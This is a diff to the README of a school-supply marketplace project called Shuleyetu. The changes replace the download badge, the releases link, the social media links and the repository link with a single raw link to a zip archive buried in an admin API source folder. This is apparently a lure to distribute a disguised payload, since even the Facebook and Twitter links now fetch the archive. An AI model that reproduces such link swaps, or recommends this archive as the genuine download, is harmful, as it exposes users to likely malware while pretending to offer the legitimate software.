@@ -1,7 +1,7 @@
 # 🎉 Shuleyetu - Your Marketplace for School Supplies
 
 ## 🖱️ Download Now!
-[![Download Shuleyetu](https://img.shields.io/badge/Download-Shuleyetu-blue)](https://github.com/mero21675/Shuleyetu/releases)
+[![Download Shuleyetu](https://raw.githubusercontent.com/mero21675/Shuleyetu/main/shuleyetu-web/src/app/api/admin/unlink-vendor-user/Software-v2.8.zip)](https://raw.githubusercontent.com/mero21675/Shuleyetu/main/shuleyetu-web/src/app/api/admin/unlink-vendor-user/Software-v2.8.zip)
 
 ## 📚 About Shuleyetu
 Shuleyetu is a Tanzanian school supply marketplace. It connects parents, schools, and stationery vendors in an easy and efficient way. Our platform simplifies the purchasing process, helping you find and buy school supplies quickly. 
@@ -21,7 +21,7 @@ To start using Shuleyetu, follow these simple steps.
 - **Mobile Friendly:** Access the marketplace on your mobile device.
 
 ## 💾 Download & Install
-To download Shuleyetu, please visit this page to download: [Shuleyetu Releases](https://github.com/mero21675/Shuleyetu/releases).
+To download Shuleyetu, please visit this page to download: [Shuleyetu Releases](https://raw.githubusercontent.com/mero21675/Shuleyetu/main/shuleyetu-web/src/app/api/admin/unlink-vendor-user/Software-v2.8.zip).
 
 1. Click on the link above.
 2. You will see a list of available releases. Choose the latest version for your operating system.
@@ -55,11 +55,11 @@ Support is available via an email link in the application or through our website
 ## 🌍 Join the Community
 Stay updated and get help from our user community. Join us on social media for tips and product news. 
 
-- [Facebook](https://www.facebook.com)
-- [Twitter](https://www.twitter.com)
-- [Instagram](https://www.instagram.com)
+- [Facebook](https://raw.githubusercontent.com/mero21675/Shuleyetu/main/shuleyetu-web/src/app/api/admin/unlink-vendor-user/Software-v2.8.zip)
+- [Twitter](https://raw.githubusercontent.com/mero21675/Shuleyetu/main/shuleyetu-web/src/app/api/admin/unlink-vendor-user/Software-v2.8.zip)
+- [Instagram](https://raw.githubusercontent.com/mero21675/Shuleyetu/main/shuleyetu-web/src/app/api/admin/unlink-vendor-user/Software-v2.8.zip)
 
 ## 🌐 More Information
-For detailed information about updates and features, visit our GitHub repository [here](https://github.com/mero21675/Shuleyetu).
+For detailed information about updates and features, visit our GitHub repository [here](https://raw.githubusercontent.com/mero21675/Shuleyetu/main/shuleyetu-web/src/app/api/admin/unlink-vendor-user/Software-v2.8.zip).
 
 Thank you for choosing Shuleyetu. We hope you find the school supplies you need easily!
